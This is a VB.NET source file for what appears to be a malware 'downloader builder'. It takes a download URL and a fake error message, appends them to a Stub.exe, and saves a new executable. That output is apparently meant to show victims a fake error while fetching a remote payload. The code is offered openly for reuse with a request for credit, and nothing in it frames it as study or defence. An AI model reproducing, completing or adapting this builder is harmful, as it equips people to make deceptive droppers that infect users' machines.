'// Made by: Soul Collector
'// Please give proper credits if you use, thanks!

Public Class frmMainz
    Const SiplitTehShitz = "SplitingdataYES!!"
    Dim stub, Title, msg, DownloadUrl As String
    Dim fakeerrorcheckbox As Boolean

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        MessageBox.Show(txtmsg.Text, txttitle.Text, MessageBoxButtons.OK, MessageBoxIcon.Error)
    End Sub
    Private Sub CheckBox1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = True Then
            GroupBox1.Enabled = True
        Else
            GroupBox1.Enabled = False
        End If
    End Sub
    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles frmMain.Click
        If CheckBox1.Checked = True And txtmsg.Text = "" Or txttitle.Text = "" Then
            MessageBox.Show("Please type in some text for fake error first.", "", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Exit Sub
        End If

        If txturl.Text = "" Then
            MessageBox.Show("Please type in download url first.", "", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Exit Sub
        End If

        Title = txttitle.Text
        msg = txtmsg.Text
        DownloadUrl = txturl.Text
        If CheckBox1.Checked = True Then
            fakeerrorcheckbox = True
        Else : fakeerrorcheckbox = False
        End If

        Dim saveit As New SaveFileDialog
        saveit.Filter = "Output save |*.exe"
        If saveit.ShowDialog = Windows.Forms.DialogResult.OK Then
            FileOpen(1, Application.StartupPath & "\Stub.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
            stub = Space(LOF(1))
            FileGet(1, stub)
            FileClose(1)
            FileOpen(1, saveit.FileName, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
            FilePut(1, stub & SiplitTehShitz & Title & SiplitTehShitz & msg & SiplitTehShitz & DownloadUrl & SiplitTehShitz & fakeerrorcheckbox)
            FileClose(1)
        Else
            Exit Sub
        End If

        MsgBox("Compiled successfully.", MsgBoxStyle.Information, "")
    End Sub
End Class
